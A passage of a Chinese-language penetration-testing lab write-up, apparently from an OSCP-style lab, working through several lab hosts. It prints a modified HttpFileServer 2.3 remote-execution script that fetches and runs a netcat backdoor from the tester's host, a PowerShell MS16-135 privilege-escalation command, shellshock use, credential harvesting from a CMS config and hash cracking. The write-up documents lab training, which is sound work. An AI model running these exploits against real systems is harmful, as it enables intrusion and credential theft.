class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-04 23:02 CST</span><br><span class="line">Stats: 0:10:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.84% done; ETC: 23:13 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.11.1.50</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">80/tcp    open  http        Microsoft IIS httpd 8.5</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /changelog.txt: Version saved</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /CHANGELOG.txt: Drupal v1</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|_  /README.txt: Interesting, a readme.</span><br><span class="line">|_http-server-header: Microsoft-IIS/8.5</span><br><span class="line">|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.</span><br><span class="line">135/tcp   open  msrpc       Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">9505/tcp  open  unknown</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Set-Cookie: HFS_SID=0.85981304012239; path=/; </span><br><span class="line">|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">|     &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">|     body &#123; font-family:tahoma, verdana, arial, helvetica, sans; font-weight:normal; font-size:9pt; background-color:#eef; &#125;</span><br><span class="line">|     html, body &#123; padding:0; border:0; height:100%; &#125;</span><br><span class="line">|     html, body, p, form &#123; margin:0 &#125;</span><br><span class="line">|     text-decoration:none; color:#47c; border:1px solid transparent; padding:0 0.1em; &#125;</span><br><span class="line">|     a:visited &#123; color:#55F; &#125;</span><br><span class="line">|     a:hover &#123; background-color:#fff; border-color:#47c; &#125;</span><br><span class="line">|     border-style:none &#125;</span><br><span class="line">|     fieldset &#123; margin-bottom:0.7em; text-align:left; padding:0.6em; &#125;</span><br><span class="line">|     #panel &#123; float:left; margin-top:1em; margin-left:1em; max-width:250px; &#125;</span><br><span class="line">|     #panel hr &#123; width:80%; margin:1em auto; &#125;</span><br><span class="line">|     #files_o</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 4933</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Set-Cookie: HFS_SID=0.4801804672461; path=/; </span><br><span class="line">|     Cache-Control: no-cache, no-store, must-revalidate, max-age=-1</span><br><span class="line">|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;/&lt;/title&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/?mode=section&amp;id=style.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot; src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">|     &lt;script&gt; if (typeof jQuery == &quot;undefined&quot;) document.write(&apos;&lt;script type=&quot;text/javascript&quot; src=&quot;/?mode=jquery&quot;&gt;&lt;/&apos;+&apos;script&gt;&apos;); &lt;/script&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; href=&quot;/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;style class=&apos;trash-me&apos;&gt;</span><br><span class="line">|     .onlyscript, button[onclick] &#123; display:none; &#125;</span><br><span class="line">|     &lt;/style&gt;</span><br><span class="line">|     &lt;script&gt;</span><br><span class="line">|     this object will store some %symbols% in the javascr</span><br><span class="line">|   HTTPOptions, RTSPRequest: </span><br><span class="line">|     HTTP/1.1 405 Method Not Allowed</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|_    Method not allowed</span><br><span class="line">49156/tcp open  msrpc       Microsoft Windows RPC</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port9505-TCP:V=7.80%I=7%D=2/4%Time=5E3988FF%P=x86_64-pc-linux-gnu%r(Get</span><br><span class="line">SF:Request,140C,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nC</span><br><span class="line">SF:ontent-Length:\x204933\r\nAccept-Ranges:\x20bytes\r\nSet-Cookie:\x20HFS</span><br><span class="line">SF:_SID=0\.4801804672461;\x20path=/;\x20\r\nCache-Control:\x20no-cache,\x2</span><br><span class="line">SF:0no-store,\x20must-revalidate,\x20max-age=-1\r\n\r\n&lt;!DOCTYPE\x20html\x</span><br><span class="line">SF:20PUBLIC\x20\&quot;-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\&quot;&gt;\r\n&lt;h</span><br><span class="line">SF:tml&gt;\r\n&lt;head&gt;\r\n\t&lt;meta\x20http-equiv=\&quot;content-type\&quot;\x20content=\&quot;t</span><br><span class="line">SF:ext/html;\x20charset=UTF-8\&quot;&gt;\r\n\t&lt;title&gt;/&lt;/title&gt;\r\n\t&lt;link\x20rel=\</span><br><span class="line">SF:&quot;stylesheet\&quot;\x20href=\&quot;/\?mode=section&amp;id=style\.css\&quot;\x20type=\&quot;text/</span><br><span class="line">SF:css\&quot;&gt;\r\n\t&lt;script\x20type=\&quot;text/javascript\&quot;\x20src=\&quot;//ajax\.google</span><br><span class="line">SF:apis\.com/ajax/libs/jquery/1\.4\.4/jquery\.js\&quot;&gt;&lt;/script&gt;\r\n\x20\x20\x</span><br><span class="line">SF:20\x20&lt;script&gt;\x20if\x20\(typeof\x20jQuery\x20==\x20\&quot;undefined\&quot;\)\x20</span><br><span class="line">SF:document\.write\(&apos;&lt;script\x20type=\&quot;text/javascript\&quot;\x20src=\&quot;/\?mode=</span><br><span class="line">SF:jquery\&quot;&gt;&lt;/&apos;\+&apos;script&gt;&apos;\);\x20&lt;/script&gt;\r\n\t&lt;link\x20rel=\&quot;shortcut\x2</span><br><span class="line">SF:0icon\&quot;\x20href=\&quot;/favicon\.ico\&quot;&gt;\r\n\t&lt;style\x20class=&apos;trash-me&apos;&gt;\r\n</span><br><span class="line">SF:\t\.onlyscript,\x20button\[onclick\]\x20&#123;\x20display:none;\x20&#125;\r\n\t&lt;/</span><br><span class="line">SF:style&gt;\r\n\x20\x20\x20\x20&lt;script&gt;\r\n\x20\x20\x20\x20//\x20this\x20obj</span><br><span class="line">SF:ect\x20will\x20store\x20some\x20%symbols%\x20in\x20the\x20javascr&quot;)%r(H</span><br><span class="line">SF:TTPOptions,51,&quot;HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nAccept-R</span><br><span class="line">SF:anges:\x20bytes\r\n\r\n405\x20-\x20Method\x20not\x20allowed&quot;)%r(RTSPReq</span><br><span class="line">SF:uest,51,&quot;HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nAccept-Ranges:</span><br><span class="line">SF:\x20bytes\r\n\r\n405\x20-\x20Method\x20not\x20allowed&quot;)%r(FourOhFourReq</span><br><span class="line">SF:uest,9A1,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/htm</span><br><span class="line">SF:l\r\nAccept-Ranges:\x20bytes\r\nSet-Cookie:\x20HFS_SID=0\.8598130401223</span><br><span class="line">SF:9;\x20path=/;\x20\r\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x</span><br><span class="line">SF:20XHTML\x201\.0\x20Transitional//EN\&quot;&gt;\r\n&lt;html&gt;\r\n\x20\x20&lt;head&gt;\r\n\</span><br><span class="line">SF:x20\x20&lt;meta\x20http-equiv=\&quot;content-type\&quot;\x20content=\&quot;text/html;\x20</span><br><span class="line">SF:charset=UTF-8\&quot;&gt;\r\n\x20\x20&lt;style\x20type=\&quot;text/css\&quot;&gt;\r\n\x20\x20bod</span><br><span class="line">SF:y\x20&#123;\x20font-family:tahoma,\x20verdana,\x20arial,\x20helvetica,\x20sa</span><br><span class="line">SF:ns;\x20font-weight:normal;\x20font-size:9pt;\x20background-color:#eef;\</span><br><span class="line">SF:x20&#125;\r\nhtml,\x20body\x20&#123;\x20padding:0;\x20border:0;\x20height:100%;\x</span><br><span class="line">SF:20&#125;\r\nhtml,\x20body,\x20p,\x20form\x20&#123;\x20margin:0\x20&#125;\r\na\x20&#123;\x20</span><br><span class="line">SF:text-decoration:none;\x20color:#47c;\x20border:1px\x20solid\x20transpar</span><br><span class="line">SF:ent;\x20padding:0\x200\.1em;\x20&#125;\r\na:visited\x20&#123;\x20color:#55F;\x20&#125;</span><br><span class="line">SF:\r\na:hover\x20&#123;\x20background-color:#fff;\x20border-color:#47c;\x20&#125;\r</span><br><span class="line">SF:\nimg\x20&#123;\x20border-style:none\x20&#125;\r\nfieldset\x20&#123;\x20margin-bottom:</span><br><span class="line">SF:0\.7em;\x20text-align:left;\x20padding:0\.6em;\x20&#125;\r\n\r\n#panel\x20&#123;\</span><br><span class="line">SF:x20float:left;\x20margin-top:1em;\x20margin-left:1em;\x20max-width:250p</span><br><span class="line">SF:x;\x20&#125;\r\n#panel\x20hr\x20&#123;\x20width:80%;\x20margin:1em\x20auto;\x20&#125;\</span><br><span class="line">SF:r\n#files_o&quot;);</span><br><span class="line">MAC Address: 00:50:56:B8:A6:F8 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 2008|7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows 7 or Windows Server 2008 R2</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: SMB: Couldn&apos;t find a NetBIOS name that works for the server. Sorry!</span><br><span class="line">| smb-vuln-cve2009-3103: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2009-3103</span><br><span class="line">|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,</span><br><span class="line">|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a</span><br><span class="line">|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</span><br><span class="line">|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,</span><br><span class="line">|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2009-09-08</span><br><span class="line">|     References:</span><br><span class="line">|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: SMB: Couldn&apos;t find a NetBIOS name that works for the server. Sorry!</span><br><span class="line">|_smb2-vuln-uptime: ERROR: Script execution failed (use -d to debug)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1449.20 seconds</span><br></pre></td></tr></table></figure>
<p>其中9505 port 看起來很像一個 web</p>
<p>進去後:</p>
<p><img src="https://i.imgur.com/oRWreke.png" alt=""></p>
<p>header 之類的都沒看到版本</p>
<p>最後在註解看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  	&lt;fieldset id=&apos;serverinfo&apos;&gt;</span><br><span class="line">&lt;legend&gt;&lt;img src=&quot;/~img0&quot;&gt; Server information&lt;/legend&gt;</span><br><span class="line">&lt;!--&lt;a href=&quot;http://www.rejetto.com/hfs/&quot;&gt;HttpFileServer 2.3&lt;/a&gt;--&gt;</span><br><span class="line">&lt;br /&gt;Server time: 2/4/2020 8:45:32 AM</span><br><span class="line">&lt;br /&gt;Server uptime: (2 days) 12:34:56</span><br></pre></td></tr></table></figure>
<p>有poc</p>
<p><a href="https://www.exploit-db.com/exploits/39161" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39161</a></p>
<p>但他的POC 能下載到我的nc.exe，但卻執行失敗</p>
<p>因此改了腳本，讓他先下載我的 msfveom 的 exe<br>在單獨僅執行這個 exe </p>
<p>改過的code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># Exploit Title: HttpFileServer 2.3.x Remote Command Execution</span><br><span class="line"># Google Dork: intext:&quot;httpfileserver 2.3&quot;</span><br><span class="line"># Date: 04-01-2016</span><br><span class="line"># Remote: Yes</span><br><span class="line"># Exploit Author: Avinash Kumar Thapa aka &quot;-Acid&quot;</span><br><span class="line"># Vendor Homepage: http://rejetto.com/</span><br><span class="line"># Software Link: http://sourceforge.net/projects/hfs/</span><br><span class="line"># Version: 2.3.x</span><br><span class="line"># Tested on: Windows Server 2008 , Windows 8, Windows 7</span><br><span class="line"># CVE : CVE-2014-6287</span><br><span class="line"># Description: You can use HFS (HTTP File Server) to send and receive files.</span><br><span class="line">#	       It&apos;s different from classic file sharing because it uses web technology to be more compatible with today&apos;s Internet.</span><br><span class="line">#	       It also differs from classic web servers because it&apos;s very easy to use and runs &quot;right out-of-the box&quot;. Access your remote files, over the network. It has been successfully tested with Wine under Linux. </span><br><span class="line"> </span><br><span class="line">#Usage : python Exploit.py &lt;Target IP address&gt; &lt;Target Port Number&gt;</span><br><span class="line"></span><br><span class="line">#EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc1.exe).  </span><br><span class="line">#          You may need to run it multiple times for success!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">	def script_create():</span><br><span class="line">		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00&#123;.+&quot;+save+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">	def execute_script():</span><br><span class="line">		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00&#123;.+&quot;+exe+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">	def nc1_run():</span><br><span class="line">		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00&#123;.+&quot;+exe1+&quot;.&#125;&quot;)</span><br><span class="line"></span><br><span class="line">	ip_addr = &quot;10.11.0.42&quot; #local IP address</span><br><span class="line">	local_port = &quot;443&quot; # Local Port number</span><br><span class="line">	#vbs = &quot;C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F&quot;+ip_addr+&quot;%2Fnc1.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc1.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with&quot;</span><br><span class="line">        #print(vbs)</span><br><span class="line">	#save= &quot;save|&quot; + vbs</span><br><span class="line">	#vbs2 = &quot;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&quot;</span><br><span class="line">        #print(vbs2)</span><br><span class="line">	#exe= &quot;exec|&quot;+vbs2</span><br><span class="line">	vbs3 = &quot;C%3A%5CUsers%5CPublic%5Cnc1.exe&quot;</span><br><span class="line">        print(vbs3)</span><br><span class="line">	exe1= &quot;exec|&quot;+vbs3</span><br><span class="line">	#script_create()</span><br><span class="line">	#execute_script()</span><br><span class="line">	nc1_run()</span><br><span class="line">except:</span><br><span class="line">	print &quot;&quot;&quot;[.]Something went wrong..!</span><br><span class="line">	Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;</span><br><span class="line">	Don&apos;t forgot to change the Local IP address and Port number on the script&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>其中nc1就是我的後門</p>
<p>這樣就拿到 shell 了</p>
<p>問題在於如何執行 ps1</p>
<p>滿滿的處方:<br><a href="https://www.freebuf.com/articles/system/93829.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/93829.html</a></p>
<p>但我都不會用Q</p>
<p>最後問人這樣做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy UnRestricted &quot;. .\Invoke-MS16-135.ps1; Invoke-MS16-135 -Application C:\Windows\System32\cmd.exe -Commandline &apos;/c whoami&apos;&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgur.com/M2zgrId.png" alt=""></p>
<p>幾個提點:</p>
<ol>
<li>reverse shell(cmd) 叫 powershell.exe的interactive shell stdout會爛掉，所以建議用powershell.exe帶參數下去叫 ps1 </li>
<li>如果用 x86的 shellcode 那他叫的powershell.exe就是32位元的，x64同理，因有些POC是x64 only 所以會有差</li>
<li>如果要在32位元的cmd執行64位元的powershell.exe(系統要是64位元的喔)，那就直接用%SYSTEMROOT%去叫64 bit的powershell.exe (%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe)</li>
</ol>
<h2 id="10-11-1-71"><a href="#10-11-1-71" class="headerlink" title="10.11.1.71 (*)"></a>10.11.1.71 (*)</h2><p>nmap:<br><img src="https://i.imgur.com/SHpcIqZ.png" alt=""><br>80 port 挖到了這個</p>
<p><img src="https://i.imgur.com/2V8pfC5.jpg" alt=""></p>
<p>也挖到了登入頁面得知是 4.0.6 version</p>
<p>但沒有明顯的 CVE 能利用</p>
<p>最後換了一個script去爆破….<br><img src="https://i.imgur.com/kN0UHbs.png" alt=""></p>
<p>原來是 cgi 的exploit Q_Q</p>
<p>admin.cgi<br><img src="https://i.imgur.com/rwoliDI.png" alt=""><br>講到cgi一定要試shellshock</p>
<p>try shellshock<br><img src="https://i.imgur.com/cZ2Ik4C.png" alt=""><br>來源:<a href="https://www.exploit-db.com/exploits/34900" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34900</a></p>
<p>get reverse shell</p>
<p><img src="https://i.imgur.com/2k5bPqf.png" alt=""></p>
<p>看了下LinEnum.sh一樣沒啥東西，他的kernel有點新，可能也不會特別去找CVE</p>
<p><a href="https://www.bigtreecms.org/developers/dev-guide/configuration-files/" target="_blank" rel="noopener">https://www.bigtreecms.org/developers/dev-guide/configuration-files/</a><br>看了下 BigTree的config檔看到這個:<br><img src="https://i.imgur.com/EX5F7wn.png" alt=""></p>
<p>用root登入mysql並進去wingnut看user profile<br><img src="https://i.imgur.com/WAX5SG5.png" alt=""></p>
<p>這個使用者在 腳本內也有出現過，我們繼續往下打 -&gt; 拿去爆密碼ㄅ</p>
<p>透過 hashcat –example 得知hash type<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MODE: 400</span><br><span class="line">TYPE: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">HASH: $P$946647711V1klyitUYhtB8Yw5DMA/w.</span><br><span class="line">PASS: hashcat</span><br></pre></td></tr></table></figure></p>
<p>結果:<br><img src="https://i.imgur.com/MWLTZDI.png" alt=""></p>
<p><img src="https://i.imgur.com/xo2GAFp.png" alt=""></p>
<h2 id="10-11-1-72"><a href="#10-11-1-72" class="headerlink" title="10.11.1.72"></a>10.11.1.72</h2><p>nmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.11.1.72</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 65522 closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d3:2e:10:0d:48:90:ce:9a:33:fb:66:3f:a0:a6:94:48 (DSA)</span><br><span class="line">|   2048 ef:0a:3b:8e:3f:92:a4:5e:f0:ab:e7:7d:75:f0:de:0e (RSA)</span><br><span class="line">|_  256 15:3a:65:3b:97:ed:e0:fc:85:bc:4b:53:48:22:61:b1 (ECDSA)</span><br><span class="line">25/tcp    open  smtp        JAMES smtpd 2.3.2</span><br><span class="line">|_smtp-commands: beta Hello nmap.scanme.org (10.11.0.42 [10.11.0.42]), </span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.20 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.2.20 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">110/tcp   open  pop3        JAMES pop3d 2.3.2</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp   nfs</span><br><span class="line">|   100003  2,3,4       2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      38581/udp6  mountd</span><br><span class="line">|   100005  1,2,3      45408/tcp   mountd</span><br><span class="line">|   100005  1,2,3      48065/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      59430/udp   mountd</span><br><span class="line">|   100021  1,3,4      37822/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      43515/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      50563/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      52146/udp   nlockmgr</span><br><span class="line">|   100024  1          36125/tcp6  status</span><br><span class="line">|   100024  1          36163/tcp   status</span><br><span class="line">|   100024  1          36974/udp6  status</span><br><span class="line">|   100024  1          57473/udp   status</span><br><span class="line">|   100227  2,3         2049/tcp   nfs_acl</span><br><span class="line">|   100227  2,3         2049/tcp6  nfs_acl</span><br><span class="line">|   100227  2,3         2049/udp   nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp6  nfs_acl</span><br><span class="line">119/tcp   open  nntp        JAMES nntpd (posting ok)</span><br><span class="line">2049/tcp  open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">4555/tcp  open  james-admin JAMES Remote Admin 2.3.2</span><br><span class="line">32922/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">36163/tcp open  status      1 (RPC #100024)</span><br><span class="line">37822/tcp open  nlockmgr    1-4 (RPC #100021)</span><br><span class="line">45408/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">57955/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">MAC Address: 00:50:56:B8:2B:16 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/18%OT=22%CT=1%CU=41597%PV=Y%DS=1%DC=D%G=Y%M=005056%T</span><br><span class="line">OS:M=5E4AD8DB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=8</span><br><span class="line">OS:)OPS(O1=M529ST11NW4%O2=M529ST11NW4%O3=M529NNT11NW4%O4=M529ST11NW4%O5=M52</span><br><span class="line">OS:9ST11NW4%O6=M529ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890</span><br><span class="line">OS:)ECN(R=Y%DF=Y%T=40%W=3908%O=M529NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+</span><br><span class="line">OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=</span><br><span class="line">OS:%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=</span><br><span 